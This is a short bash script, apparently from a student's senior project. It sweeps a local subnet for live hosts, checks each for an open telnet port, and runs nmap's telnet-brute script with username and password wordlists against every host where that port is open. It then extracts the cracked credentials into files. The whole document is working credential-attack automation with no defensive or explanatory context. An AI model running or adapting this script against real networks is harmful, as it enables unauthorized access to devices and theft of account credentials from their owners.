#!/bin/bash

sudo nmap -sn 192.168.1.0/24 > InitialScan
grep for InitialScan | cut -d ' ' -f5 > IPs

file="/home/bjakell/SeniorProject/IPs"
while IFS= read -r line
do
    printf '%s\n'"$line"
    nmap -p 23 "$line" > TelnetPorts
    printf "\n"
    open=$(grep tcp TelnetPorts | cut -d ' ' -f2)
    if [ "$open" = "open" ]
    then
        nmap -p 23 --script telnet-brute --script-args userdb=user.txt,passdb=passwd.txt $line > CredOutput
        cat CredOutput  | grep -A1 "Accounts" | grep -v "Accou" | grep -o "[a-zA-Z0-9][^:]*:[^ ]*" | cut -d ':' -f1 > username.txt
        tail -n 5 CredOutput | head -n 1 | cut -d ':' -f2 | cut -d '-' -f1 > password.txt
    fi
done < "$file"
